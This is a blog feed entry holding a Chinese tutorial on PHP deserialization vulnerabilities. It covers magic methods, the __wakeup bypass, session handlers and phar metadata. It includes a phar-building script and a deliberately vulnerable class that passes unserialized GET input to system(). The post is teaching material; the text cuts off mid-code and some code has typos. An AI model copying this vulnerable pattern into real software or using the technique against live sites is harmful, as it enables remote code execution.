<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>孤独星球</title>
  
  <subtitle>H3h3QAQの博客</subtitle>
  <link href="https://h3h3qaq.github.io/atom.xml" rel="self"/>
  
  <link href="https://h3h3qaq.github.io/"/>
  <updated>2021-11-10T14:07:17.025Z</updated>
  <id>https://h3h3qaq.github.io/</id>
  
  <author>
    <name>H3h3QAQ</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="https://h3h3qaq.github.io/posts/0.html"/>
    <id>https://h3h3qaq.github.io/posts/0.html</id>
    <published>2021-11-10T12:05:12.135Z</published>
    <updated>2021-11-10T14:07:17.025Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="PHP序列化与序列化"><a href="#PHP序列化与序列化" class="headerlink" title="PHP序列化与序列化"></a>PHP序列化与序列化</h1><p>作者：H3h3QAQ</p><h2 id="一、PHP序列化和反序列化"><a href="#一、PHP序列化和反序列化" class="headerlink" title="一、PHP序列化和反序列化"></a>一、PHP序列化和反序列化</h2><h3 id="1-PHP反序列化："><a href="#1-PHP反序列化：" class="headerlink" title="1.PHP反序列化："></a>1.PHP反序列化：</h3><p><code>serialize()</code></p><p>将变量或者对象转换成字符串的过程，用于存储或传递PHP的值的过程种，同时不丢失其类型和结构</p><p>常见的序列化字母表示及其含义：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">a <span class="token operator">-</span> <span class="token keyword">array</span>    <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">a</span><span class="token punctuation">:</span><span class="token operator">&lt;</span>n<span class="token operator">&gt;</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token operator">&lt;</span>key <span class="token number">1</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>value <span class="token number">1</span><span class="token operator">&gt;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&lt;</span>key n<span class="token operator">&gt;</span><span class="token operator">&lt;</span>value n<span class="token operator">&gt;</span><span class="token punctuation">}</span>b <span class="token operator">-</span> boolean  <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">b</span><span class="token punctuation">:</span><span class="token operator">&lt;</span>digit<span class="token operator">&gt;</span>d <span class="token operator">-</span> double   <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">d</span><span class="token punctuation">:</span><span class="token operator">&lt;</span>number<span class="token operator">&gt;</span>i <span class="token operator">-</span> integer  <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">i</span><span class="token punctuation">:</span><span class="token operator">&lt;</span>number<span class="token operator">&gt;</span>o <span class="token operator">-</span> common r <span class="token operator">-</span> references <span class="token operator">-</span> string   <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">s</span><span class="token punctuation">:</span><span class="token operator">&lt;</span>length<span class="token operator">&gt;</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"&lt;value&gt;"</span><span class="token constant">C</span> <span class="token operator">-</span> custom object<span class="token constant">O</span> <span class="token operator">-</span> <span class="token keyword">class</span>    <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">O</span><span class="token punctuation">:</span><span class="token operator">&lt;</span>length<span class="token operator">&gt;</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"&lt;class name&gt;"</span><span class="token punctuation">:</span><span class="token operator">&lt;</span>n<span class="token operator">&gt;</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token operator">&lt;</span>field name <span class="token number">1</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>field value1<span class="token operator">&gt;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&lt;</span>field name n<span class="token operator">&gt;</span><span class="token operator">&lt;</span>field value n<span class="token operator">&gt;</span><span class="token punctuation">}</span><span class="token constant">N</span> <span class="token operator">-</span> <span class="token constant">null</span><span class="token constant">R</span> <span class="token operator">-</span> pointer reference<span class="token constant">U</span> <span class="token operator">-</span> unicode string<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">h3</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$v1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$v2</span><span class="token operator">=</span><span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$v3</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$v4</span><span class="token operator">=</span><span class="token number">2.1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$v5</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$v6</span><span class="token operator">=</span><span class="token double-quoted-string string">"h3h3QAQ"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$v7</span><span class="token operator">=</span><span class="token double-quoted-string string">"H3h3QAQ"</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$v8</span><span class="token operator">=</span><span class="token double-quoted-string string">"protected"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$s</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">h3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token variable">$s</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>序列化运行结果为：</p><pre class="line-numbers language-none"><code class="language-none">O:2:"h3":8:{s:2:"v1";N;s:2:"v2";b:0;s:2:"v3";i:1;s:2:"v4";d:2.1;s:2:"v5";a:0:{}s:2:"v6";s:7:"h3h3QAQ";s:6:" h3 v7";s:7:"H3h3QAQ";s:5:" * v8";s:9:"protected";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>反序列化运行结果</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">object</span><span class="token punctuation">(</span>h3<span class="token punctuation">)</span><span class="token shell-comment comment">#1 (8) {</span>  <span class="token punctuation">[</span><span class="token double-quoted-string string">"v1"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token constant">NULL</span>  <span class="token punctuation">[</span><span class="token double-quoted-string string">"v2"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token function">bool</span><span class="token punctuation">(</span><span class="token boolean constant">false</span><span class="token punctuation">)</span>  <span class="token punctuation">[</span><span class="token double-quoted-string string">"v3"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token punctuation">[</span><span class="token double-quoted-string string">"v4"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token function">float</span><span class="token punctuation">(</span><span class="token number">2.1</span><span class="token punctuation">)</span>  <span class="token punctuation">[</span><span class="token double-quoted-string string">"v5"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token punctuation">}</span>  <span class="token punctuation">[</span><span class="token double-quoted-string string">"v6"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token double-quoted-string string">"h3h3QAQ"</span>  <span class="token punctuation">[</span><span class="token double-quoted-string string">"v7"</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"h3"</span><span class="token punctuation">:</span><span class="token keyword">private</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token double-quoted-string string">"H3h3QAQ"</span>  <span class="token punctuation">[</span><span class="token double-quoted-string string">"v8"</span><span class="token punctuation">:</span><span class="token keyword">protected</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token double-quoted-string string">"protected"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="（1）各种魔术方法"><a href="#（1）各种魔术方法" class="headerlink" title="（1）各种魔术方法"></a>（1）各种魔术方法</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>：<span class="token comment">//析构函数当对象被销毁时会被自动调用</span><span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//unserialize()时会被自动调用</span><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//当尝试以调用函数的方法调用一个对象时，会被自动调用</span><span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//在对象上下文中调用不可访问的方法时触发</span><span class="token function">__callStatci</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//在静态上下文中调用不可访问的方法时触发</span><span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//用于从不可访问的属性读取数据</span><span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//用于将数据写入不可访问的属性</span><span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//在不可访问的属性上调用isset()或empty()触发</span><span class="token function">__unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//在不可访问的属性上使用unset()时触发</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//把类当作字符串使用时触发</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用</span><span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">//serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当PHP5&lt;5.6.25、PHP7&lt;7.0.1时，当成员属性数目大于实际数码时可绕过__wakeup方法（CVE-2016-7124）</p><h4 id="（2）PHP反序列化特性"><a href="#（2）PHP反序列化特性" class="headerlink" title="（2）PHP反序列化特性"></a>（2）PHP反序列化特性</h4><p>1.PHP在反序列化时，底层代码时以<code>;</code>作为字段的分隔，以<code>}</code>作为结尾（字符串除外），并且是根据长度判断内容的。</p><p>2.在反序列的时候php会根据s所指定的字符长度去读取后面的字符。如果指定的长度错误则反序列化就会失败。</p><p>3.对类中不存在的属性也会进行反序列化。</p><h3 id="2-session反序列化"><a href="#2-session反序列化" class="headerlink" title="2.session反序列化"></a><strong>2.session反序列化</strong></h3><h4 id="（1）session概念"><a href="#（1）session概念" class="headerlink" title="（1）session概念"></a>（1）session概念</h4><p>PHP session时一个特殊的变量，用于存储有关用户会话的信息，或更改用户会话的设置。session变量保存的信息是单一用户的，并且可供应用程序中的所有界面使用。它每个访问或者创建都有唯一的id（UID），并基于这个UID来储存变量。UID储存在cookie中，或者通过URL来进行传导。</p><h4 id="（2）会话过程"><a href="#（2）会话过程" class="headerlink" title="（2）会话过程"></a>（2）会话过程</h4><p>当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie），如果请求中不包括会话ID信息，PHP就会创建一个新的会话。会话开始之后，PHP就会将会话中的数据设置到<code>$_SESSION</code>变量中。当PHP停止的时候，它会自动读取<code>$_SESSION</code>中的内容，并将其进行序列化，然后发送会话保存管理器来进行保存。</p><p>默认情况下，PHP使用内置的文件会话保存管理器（files）来完成会话的保存。可以通过调用函数<code>session_start()</code>来手动开始一个会话。如果配置项<code>session.auto_start</code>设置为1，那么请求开始的时候，会话会自动开始</p><p>PHP脚本执行完毕之后，会话会自动关闭。同时，也可以通过调用函数<code>session_write_close()</code>来手动关闭会话</p><h4 id="（3）存储引擎"><a href="#（3）存储引擎" class="headerlink" title="（3）存储引擎"></a>（3）存储引擎</h4><p>PHP中的session中的内容默认是以文件的方式储存，储存方式是由配置项<code>session.save_handler</code>来进行确定的，默认是以文件的方式储存。储存的文件是以<code>sess_PHPSESSID</code>来进行命名的，文件的内容就是session值得序列化之后得内容。</p><p><code>session.serialize_handler</code>有如下三种取值：</p><p><img src="https://i.loli.net/2021/08/24/yTPxw3vL9GoS7A5.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">in_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'session.serialize_handeler'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'php_binary'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这里可以换不同的存储引擎</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每种存储引擎存储的内容格式：</p><p><img src="https://i.loli.net/2021/08/24/2qIVl4jeL6mwSMg.png"></p><h3 id="3-phar反序列化"><a href="#3-phar反序列化" class="headerlink" title="3.phar反序列化"></a>3.phar反序列化</h3><p>phar反序列化就是可以在不使用php函数unserialize()的前提下，进行反序列化，从而引起php对象注入漏洞</p><p>phar文件的结构：</p><pre class="line-numbers language-none"><code class="language-none">-stub：phar文件标识，前面内容不限，但是必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件-manifest：压缩文件的属性等信息，以序列化的形式储存自定义的meat-data，这里就是漏洞利用的关键点-contents：压缩文件的内容-signature：签名，在文件末尾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>生成phar文件</p><pre class="line-numbers language-none"><code class="language-none">一定要将php.ini中的phar.readonly选项设置为Off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">h3</span><span class="token punctuation">{</span><span class="token punctuation">}</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"GIF89a"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;?php__HALT_COMPILER();?&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置stub，添加gif文件头</span><span class="token variable">$o</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">h3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将自定义meat-data存入manifest</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"test.txt"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//添加要压缩的文件</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>##二、反序列化漏洞</p><h3 id="1-反序列化成因"><a href="#1-反序列化成因" class="headerlink" title="1.反序列化成因"></a>1.反序列化成因</h3><p>主要是反序列化过程中某些参数可控，传入构造的字符串，从而控制内部的变量设置函数，执行想要的操作</p><h4 id="（1）phar反序列化漏洞造成原因"><a href="#（1）phar反序列化漏洞造成原因" class="headerlink" title="（1）phar反序列化漏洞造成原因"></a>（1）phar反序列化漏洞造成原因</h4><p>漏洞出发点在使用<code>phar://</code>协议读取文件的时候，文件内容黑背解析成为phar对象，然后phar对象内的Meta-data信息会被反序列化。当内核调用phar_parse_metadata()解析met-adata数据时，会调用php_var_unserialize()对其进行反序列化操作，因此会造成漏洞</p><h3 id="2-反序列化漏洞"><a href="#2-反序列化漏洞" class="headerlink" title="2.反序列化漏洞"></a>2.反序列化漏洞</h3><h4 id="（1）PHP反序列化漏洞"><a href="#（1）PHP反序列化漏洞" class="headerlink" title="（1）PHP反序列化漏洞"></a>（1）PHP反序列化漏洞</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_string</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'exam_day1.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">home</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$method</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span> <span class="token operator">=</span> <span class="token variable">$method</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span> <span class="token operator">=</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment">// TODO: Implement __destruct() method.</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ping"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">ping</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ping -C 2 <span class="token interpolation"><span class="token variable">$host</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以简单的分析一下代码</p><p>定义了一个<code>class</code>类，类中有两个私有变量<code>method</code>和<code>args</code></p><p>有三个魔术方法：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span>  <span class="token comment">//构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span> <span class="token operator">=</span> <span class="token variable">$method</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span> <span class="token operator">=</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//析构函数当对象被销毁时会被自动调用</span>    <span class="token punctuation">{</span>        <span class="token comment">// TODO: Implement __destruct() method.</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ping"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//unserialize()时会被自动调用</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析代码段中<code>host</code>的来源，想办法利用<code>system()</code>构成RCE</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_string</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'exam_day1.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">home</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$method</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$args</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token comment">//构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span> <span class="token operator">=</span> <span class="token variable">$method</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span> <span class="token operator">=</span> <span class="token variable">$args</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//析构函数当对象被销毁时会被自动调用</span>    <span class="token punctuation">{</span>        <span class="token comment">// TODO: Implement __destruct() method.</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ping"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">method</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">ping</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ping -C 2 <span class="token interpolation"><span class="token variable">$host</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//unserialize()时会被自动调用</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">args</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span>@<span class="token variable">$_GET</span><span class="token 